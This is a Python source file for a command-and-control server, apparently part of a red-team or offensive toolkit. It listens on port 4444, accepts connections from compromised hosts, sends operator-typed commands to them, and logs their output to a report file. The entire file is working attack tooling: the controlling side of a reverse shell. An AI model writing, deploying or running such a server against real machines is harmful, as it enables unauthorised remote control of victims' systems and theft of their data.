import os
import json
import socket
import threading
import time
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Load Config
CONFIG_FILE = "config/settings.json"
if not os.path.exists(CONFIG_FILE):
    print(Fore.RED + f"⚠️ Config file {CONFIG_FILE} is missing! Run `setup_config.py`")
    exit(1)

with open(CONFIG_FILE) as config_file:
    config = json.load(config_file)

C2_SERVER = config.get("C2_SERVER", "0.0.0.0")
C2_PORT = config.get("C2_PORT", 4444)
TIMEOUT = config.get("TIMEOUT", 10)

# Save C2 logs
def log_c2(data):
    os.makedirs("reports", exist_ok=True)
    log_path = "reports/c2_log.txt"

    with open(log_path, "a") as log_file:
        log_file.write(data + "\n")

    print(Fore.GREEN + f"📄 C2 Log saved: {log_path}")

# Handle incoming client connections
def handle_client(client_socket, addr):
    print(Fore.YELLOW + f"⚡ New connection from {addr}")
    log_c2(f"New Connection: {addr}")

    while True:
        try:
            command = input(Fore.CYAN + "C2 > ")
            if command.lower() == "exit":
                client_socket.send(b"exit")
                print(Fore.RED + "❌ Closing connection.")
                log_c2("Connection closed.")
                client_socket.close()
                break

            client_socket.send(command.encode())
            output = client_socket.recv(4096).decode()
            print(Fore.GREEN + output)
            log_c2(output)

        except Exception as e:
            print(Fore.RED + f"❌ Error handling client: {e}")
            log_c2(f"Error: {e}")
            break

# Start the C2 Server
def start_c2():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((C2_SERVER, C2_PORT))
    server.listen(5)

    print(Fore.MAGENTA + f"🚀 C2 Server running on {C2_SERVER}:{C2_PORT}...")
    log_c2(f"C2 Server started on {C2_SERVER}:{C2_PORT}")

    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_thread.start()

# Main Execution
def main():
    try:
        start_c2()
    except KeyboardInterrupt:
        print(Fore.RED + "\n❌ C2 Server Stopped.")
        log_c2("C2 Server Stopped.")

if __name__ == "__main__":
    main()
